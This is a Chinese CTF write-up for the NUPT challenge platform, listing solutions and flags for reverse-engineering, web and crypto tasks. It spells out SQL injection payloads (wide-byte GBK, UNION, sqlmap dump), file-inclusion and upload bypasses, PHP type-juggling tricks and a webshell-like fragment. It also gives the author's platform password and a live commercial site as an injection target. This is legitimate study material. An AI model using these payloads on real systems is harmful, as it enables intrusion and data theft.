

















**<font face="微软雅黑" color="black" size="7" align="center">南邮CTF-writeup</font>**






#旧CTF平台
---


##用户信息


链接：
	
	http://ctf.nuptzj.cn/team/6247
	https://cgctf.nuptsast.com/challenges   

用户名: 


	三个老斯基来1发  

密码:  

	
	19920211

##re  

1. hello.exe  
萨达十大

		拖入IDA，入门级的RE，直接F5看到main的代码，很简单，写入内存的flag，按R将数据转换为字符：
		刚开始看的时候没理解galf是什么意思，照着输却报错
		后来下断到内存里看，发现是大端序的原因。每个变量的四字节需要逆序一下，于是得到flag
		strcmp
		flag{Welcome_To_RE_World!}
		IDA只有32位的可以调用F5插件
		
2. readasm
题目：

		读汇编是逆向基本功。
		给出的文件是func函数的汇编
		main函数如下
		输出的结果即为flag，格式为flag{**********}，请连flag{}一起提交
		
		编译环境为linux gcc x86-64
		调用约定为System V AMD64 ABI
		请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力
		
		int main(int argc, char const *argv[])
		{
		  char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,
		                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,
		                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};
		  func(input, 28);
		  printf("%s\n",input+1);
		  return 0;
		}
		
		参考资料:
		https://github.com/veficos/reverse-engineering-for-beginners
		《汇编语言》王爽
		《C 反汇编与逆向分析技术揭秘》

	解答：

		push [1000H] 就不用指明访问的是字单元还是字节单元，因为push指令只进行字操作
		在没有寄存器名存在的情况下，用操作符 X ptr 指明内存单元的长度，X在汇编指令中可以为word或byte

		
			
			
##WEB  

1. 送分题!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!  
50  
		
		查看源代码

2. MD5 collision!!!!!!!!!!!!!!!!!!!!!!!!!!!!  
50

			QNKCDZO==240610708
			QNKCDZO
			240610708
			s878926199a
			s155964671a
			s214587387a
			s214587387a
			sha1(str)
			sha1('aaroZmOk')  
			sha1('aaK1STfY')
			sha1('aaO8zKZF')
			sha1('aa3OFF9m')
	
			nctf{md5_collision_is_easy}

3. 签到2 网络攻防大赛!!!!!!!!!!!!!!!!!!!!!  
50


		http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php

		text1=zhimakaimen

		nctf{follow_me_to_exploit}

4. 这题不是WEB!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
100
查看图片数据

		nctf{photo_can_also_hid3_msg}


5. 层层递进!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
100
层层查看源代码

		nctf{this-is_a_fl4g}

6.aaencode!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
ppencode/rrencode/jjencode/aaencode  
js格式化，去掉eval，console中执行 

		https://tool.zcmzcm.org/aadecode
		alert("nctf{javascript_aaencode}")

7.单身二十年!!!!!!!!!!!!!!!!!!  
100  
	
		<script>window.location="./no_key_is_here_forever.php"; </script>
		nctf{yougotit_script_now}

8.你从哪里来!!!!!!!!!!!!!!!!!!!!!!!!!!!!
100

		Referer: http://google.com
		nctf{http_referer}
		74.117.178.147

9.phpdecode!!!!!!!!!!!!!!!!!
100

	gzinflate,base64_decode,strlen,chr,ord
	php C:\Users\tulu\Desktop\CTF\phpdecode.php
	nctf{gzip_base64_hhhhhh}

10.文件包含!!!!!!!!!!!!!!!!!!!!
150  

		http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
		
		<html>
			<title>asdf</title>   
		<?php
			error_reporting(0);
			if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
			$file=$_GET['file'];
			if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
				echo "Oh no!";
				exit();
			}
			include($file); 
		//flag:nctf{edulcni_elif_lacol_si_siht}
		?>
		</html>
		
		nctf{edulcni_elif_lacol_si_siht}

11.单身一百年也没用

	response
	flag: nctf{this_is_302_redirect}

12.download

	http://way.nuptzj.cn/web6/download.php?url=YnV4aWFuZ3poYW5nZGEubXAz
	http://way.nuptzj.cn/web6/download.php?url=aGVyZWlza2V5LnBocA==
	nctf{download_any_file_666}

13.COOKIE
	
	0==not
	login=1
	nctf{cookie_is_different_from_session}


14.MYSQL!!!!!!!!!!!!!!
200
robots.txt
	
	sql.php
		<?php
		if($_GET[id]) {
		   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
		  mysql_select_db(SAE_MYSQL_DB);
		  $id = intval($_GET[id]);
		  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
		  if ($_GET[id]==1024) {
			  echo "<p>no! try again</p>";
		  }
		  else{
			echo($query[content]);
		  }
		}
		?>
	
	chinalover.sinaapp.com/web11/sql.php?id=1024.1
	nctf{query_in_mysql}


15.sql injection 3
200
	
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1
	Payload: id=%df' UNION ALL SELECT NULL,CONCAT(0x7178767171,0x4e49696a6566556a4d73,0x716a767671)#
	Payload: id=%df' AND 2369=BENCHMARK(5000000,MD5(0x78695172))#
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df' union all select NULL,database()%23
	sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 --prefix="%df'" --suffix="%23" --dump-all

	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-3310%df' UNION ALL SELECT NULL,database()-- 123
	sae-chinalover
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-3310%df' UNION ALL SELECT NULL,user()-- 123
	sae-chinalover@220.181.129.102
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-3310%df' UNION ALL SELECT NULL,table_name from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572 limit 4,1-- 123
	ctf4
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-3310%df' UNION ALL SELECT NULL,column_name from information_schema.columns where table_name=0x63746634 limit 1,1-- 123
	flag
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-3310%df' UNION ALL SELECT NULL,flag from ctf4 limit 0,1-- 123
	nctf{gbk_3sqli}

	mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10

16./x00!!!!!!!!!!!!!!!!!!!!!!!!!!!!
200
题目有多种解法，你能想出来几种？

	if (isset ($_GET['nctf'])) {
		if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
			echo '必须输入数字才行';
		else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
			die('Flag: '.$flag);
		else
			echo '骚年，继续努力吧啊~';
	}

	ereg/strpos
	http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=12345%00%23biubiubiu
	http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=111
	flag:nctf{use_00_to_jieduan}

17.bypass again!!!!!!!!!!!!!!!!!!!!!!!!!!!
200
if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) === md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
URL可以传递数组参数，形式是http://haha.com?x[]=1&x[]=2&x[]=3，这样就提交了一个x[]={1,2,3}的数组。
在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null
http://chinalover.sinaapp.com/web17/index.php?a[]=1&b[]=2
Flag: nctf{php_is_so_cool}

18.变量覆盖
http://chinalover.sinaapp.com/web18/index.php
pass=1&thepassword_123=1
nctf{bian_liang_fu_gai!}


19.PHP是世界上最好的语言??????????????????????????????????????
250
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ 
nctf{php_is_best_language}


20.伪装者
x-forwarded-for:127.0.0.1
nctf{happy_http_headers}


21.header
flag隐藏在响应头里
nctf{tips_often_hide_here}

22.上传绕过
250
dir /uploads/1.php(0x00)1.jpg
nctf{welcome_to_hacks_world} 
);$R.=php_uname();$R.="({$usr})";print $R;;echo("|<-");die();


23.SQL注入1!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
300
http://chinalover.sinaapp.com/index.php
user=admin')/**/or/**/1=1%23&pass=11
nctf{ni_ye_hui_sql?}

24.pass check
300
<?php
	$pass=@$_POST['pass'];
	$pass1=***********;//被隐藏起来的密码
	if(isset($pass))
	{
	if(@!strcmp($pass,$pass1)){
	echo "flag:nctf{*}";
	}else{
	echo "the pass is wrong!";
	}
	}else{
	echo "please input pass!";
	}
?>
strcmp漏洞
echo (int)strcmp('pending',array());
will output -1 in PHP 5.2.16 (probably in all versions prior 5.3)
but will output 0 in PHP 5.3.3
构造数组绕过
http://chinalover.sinaapp.com/web21/
pass[]=1
nctf{strcmp_is_n0t_3afe}      

25.起名字真难
300
<?php
 function noother_says_correct($number)
{
		$one = ord('1');
		$nine = ord('9');
		for ($i = 0; $i < strlen($number); $i++)
		{   
				$digit = ord($number{$i});
				if ( ($digit >= $one) && ($digit <= $nine) )
				{
						return false;
				}
		}
		   return $number == '54975581388';
}
$flag='*******';
if(noother_says_correct($_GET['key']))
	echo $flag;
else 
	echo 'access denied';
?>
16进制编码绕过
chinalover.sinaapp.com/web12/index.php?key=0xccccccccc
nctf{follow_your_dream}

26.密码重置
	300
	重置管理员账号：admin 的密码

	get限定用户名，应同时修改post和get数据
	http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4=
	user=admin&newpass=111&vcode=1234
	nctf{reset_password_often_have_vuln}

27.php 反序列化
300

http://115.28.150.176/php1/index.php
代码：

	<?php
	class just4fun {
	    var $enter;
	    var $secret;
	}
	
	if (isset($_GET['pass'])) {
	    $pass = $_GET['pass'];
	
	    if(get_magic_quotes_gpc()){
	        $pass=stripslashes($pass);
	    }
	
	    $o = unserialize($pass);
	
	    if ($o) {
	        $o->secret = "*";
	        if ($o->secret === $o->enter)
	            echo "Congratulation! Here is my secret: ".$o->secret;
	        else 
	            echo "Oh no... You can't fool me";
	    }
	    else echo "are you trolling?";
	}
	?>

	思路：
	http://www.zhzzhz.com/detault/%E5%8D%97%E9%82%AEctf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-writeup.html
    <?php   
    class just4fun {  
        var $enter;  
        var $secret;  
        function just4fun()  
        {  
            $this->enter=&$this->secret;  
        }  
    }  
    echo serialize(new just4fun());  
    ?>  

	构造序列化对象,令$o->enter===$o->secret
	在 PHP 中普通的传值赋值行为有个例外就是碰到对象 object 时，在 PHP 5 中是以引用赋值的，除非明确使用了 clone 关键字来拷贝，PHP 支持引用赋值，使用“$var = &$othervar;”语法。引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西
	class just4fun {
	    var $enter;
	    var $secret;
		function just4fun()  
        {  
            $this->enter=&$this->secret;  
        }
	}
	$o=new just4fun();
	echo serialize($o)

	O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}

28. sql injection 4 300

	继续注入吧~
	题目地址
	
	TIP:反斜杠可以用来转义
	仔细查看相关函数的用法
	<!--
	#GOAL: login as admin,then get the flag;
	error_reporting(0);
	require 'db.inc.php';
	
	function clean($str){
		if(get_magic_quotes_gpc()){
			$str=stripslashes($str);
		}
		return htmlentities($str, ENT_QUOTES);
	}
	
	$username = @clean((string)$_GET['username']);
	$password = @clean((string)$_GET['password']);
	
	$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
	$result=mysql_query($query);
	if(!$result || mysql_num_rows($result) < 1){
		die('Invalid password!');
	}
	
	echo $flag;
	-->
	Invalid password!

	解答：

		构造思路：SELECT * FROM users WHERE name='aaaa AND pass=' or 1 %23
		SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';
	
		http://chinalover.sinaapp.com/web15/index.php?username=\&password=or 1;%23
		http://chinalover.sinaapp.com/web15/index.php?username=\&password=or 1%23

		mysql_query(）
			mysql_query() 函数执行一条 MySQL 查询
			如果没有打开的连接，本函数会尝试无参数调用 mysql_connect() 函数来建立一个连接并使用之。
	
			mysql_query(query,connection)
	
			参数 	描述
			query 	必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。
			connection 	可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。
	
			mysql_query() 仅对 SELECT，SHOW，EXPLAIN 或 DESCRIBE 语句返回一个资源标识符，如果查询执行不正确则返回 FALSE。
			对于其它类型的 SQL 语句，mysql_query() 在执行成功时返回 TRUE，出错时返回 FALSE。	
			非 FALSE 的返回值意味着查询是合法的并能够被服务器执行。这并不说明任何有关影响到的或返回的行数。很有可能一条查询执行成功了但并未影响到或并未返回任何行。
	
		clean($str)
		get_magic_quotes_gpc()
		stripslashes($str)
		htmlentities($str, ENT_QUOTES)
		mysql_num_rows($result)	

		nctf{sql_injection_is_interesting}

29. 综合题
300

题目地址：tip:bash

http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php
在命令行执行js特殊编码
1bc29b36f623ba82aaf6724fd3b16718.php
tip: history of bash
http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history
zip -r flagbak.zip ./*
teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip	
nctf{bash_history_means_what}
	
30. system
system
300

tips:其他题目的源码我也放出来了，题目地址：http://139.199.71.170:44227/

github:https://github.com/otakekumi/NUPT_Challenges

虽然可以直接来这儿找，但还是好好做吧，来源：CSAW2016，汉化来自:Jarvis OJ

31. sql注入2 400
	注入第二题~~主要考察union查询
	传送门:点我带你飞

		<html>
		<head>
		Secure Web Login II
		</head>
		<body>
		
		<?php
		if($_POST[user] && $_POST[pass]) {
		   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
		  mysql_select_db(SAE_MYSQL_DB);
		  $user = $_POST[user];
		  $pass = md5($_POST[pass]);
		  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
		  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
		      echo "<p>Logged in! Key: ntcf{**************} </p>";
		  }
		  else {
		    echo("<p>Log in failure!</p>");
		  }
		}
		?>
		
		
		<form method=post action=index.php>
		<input type=text name=user value="Username">
		<input type=password name=pass value="Password">
		<input type=submit>
		</form>
		</body>
		<a href="index.phps">Source</a>
		</html>

		https://wenku.baidu.com/view/3f3e03c84431b90d6c85c7fb.html
		漏洞点$query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));因为前面是post所以就是钥匙式注入（万能密码）跟'程序员的问题'不同，这里用户和密码分开判了所以注释掉pw不可行，只要让$query[pw]的值与pass经过md5之后的值相等即可,而$pass经过md5之后的值是我们可以通过正常输入控制的同时，$query[pw]的值是从$sql提取出来的目标就一句话：只要我们能够修改$sql的值，此题解决。
		
		再次审视注入点：
		$query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
		在这里我们可以利用sql语句，直接给$sql返回一个值。也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决
		
		http://4.chinalover.sinaapp.com/web6/index.phps
		http://4.chinalover.sinaapp.com/web6/index.php 
		post:user=1' and 0=1 union select "c4ca4238a0b923820dcc509a6f75849b"#&pass=1
		ntcf{union_select_is_wtf} 

		mysql_connect()
		mysql_select_db()
		mysql_fetch_array()
		mysql_query()
		strcasecmp()

32. 综合题2 400
非xss题 但是欢迎留言~
地址：get the flag

http://cms.nuptzj.cn/
view-source:http://cms.nuptzj.cn/index.php?page=1
view-source:http://cms.nuptzj.cn/about.php?file=sm.txt
view-source:http://cms.nuptzj.cn/about.php?file=index.php
view-source:http://cms.nuptzj.cn/about.php?file=say.php
view-source:http://cms.nuptzj.cn/about.php?file=passencode.php
view-source:http://cms.nuptzj.cn/so.php
view-source:http://cms.nuptzj.cn/about.php?file=sm.txt

33. 注入实战1
注入实战1
500

请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉）
目标网址：地址
flag为管理员密码的32位md5(小写)
并且加上nctf{}

手注教程群里面发过。
看不懂的话自行百度"mysql手动注入"查阅相关文章

PS:用sqlmap等工具做的就不要厚脸皮提交了

注册信息：username,Bai12345678
123456@qq.com
http://backstagecommerce.ca/marketing-portal/register/?message=pending&uid=112
http://backstagecommerce.ca/marketing-portal/login/?err=awaiting_admin_review
http://backstagecommerce.ca/marketing-portal/password-reset/

34. 密码重置2
密码重置2
500

题题被秒，当时我就不乐意了！
本题来源于CUMT
题目链接

TIPS:
1.管理员邮箱观察一下就可以找到
2.linux下一般使用vi编辑器，并且异常退出会留下备份文件
3.弱类型bypass

	admin@nuptzj.cn
	http://nctf.nuptzj.cn/web14/.submit.php.swp
	http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&token=0000000000
	nctf{thanks_to_cumt_bxs}
	........这一行是省略的代码........
	
	/*
	如果登录邮箱地址不是管理员则 die()
	数据库结构
	
	--
	-- 表的结构 `user`
	--
	
	CREATE TABLE IF NOT EXISTS `user` (
	  `id` int(11) NOT NULL AUTO_INCREMENT,
	  `username` varchar(255) NOT NULL,
	  `email` varchar(255) NOT NULL,
	  `token` int(255) NOT NULL DEFAULT '0',
	  PRIMARY KEY (`id`)
	) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;
	
	--
	-- 转存表中的数据 `user`
	--
	
	INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
	(1, '****不可见***', '***不可见***', 0);
	*/
	
	
	........这一行是省略的代码........
	
	if(!empty($token)&&!empty($emailAddress)){
		if(strlen($token)!=10) die('fail');
		if($token!='0') die('fail');
		$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
		$r = mysql_query($sql) or die('db error');
		$r = mysql_fetch_assoc($r);
		$r = $r['num'];
		if($r>0){
			echo $flag;
		}else{
			echo "失败了呀";
		}
	}
		
	
	
	备份文件泄露方式
		Vim 的临时交换文件 .filename.swp
		如.submit.php.swp
		默认交换文件在打开文件的时候就会产生交换文件，正常退出的时候才会删除交换文件（断电，Ctrl+Z强制退出就不会删除），内容大致是这个样子。
		Vim 的备份文件
		index.php~
		vim的undo文件
		.filename.un.~
		filename.bak
		robots.txt
		.bash_history


		
##MISC
		
		
##Crypto
			1.easy!
				bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9
				nctf{this_is_base64_encode}
			
			2.键盘密码
				nctf{areuhack}
				
			3.base64全家桶
			base64,32,16
			nctf{base64_base32_and_base16}
			base16
			
			4.n次base64
			nctf{please_use_python_to_decode_base64}
			padding
				


	}
	
#新CTF平台
---
##用户信息

链接：
	

	https://cgctf.nuptsast.com/challenges   

用户名: 
 
	yan  

密码:  
	
	19920211


##web



##RE



##PWN



##Crypto



##Misc





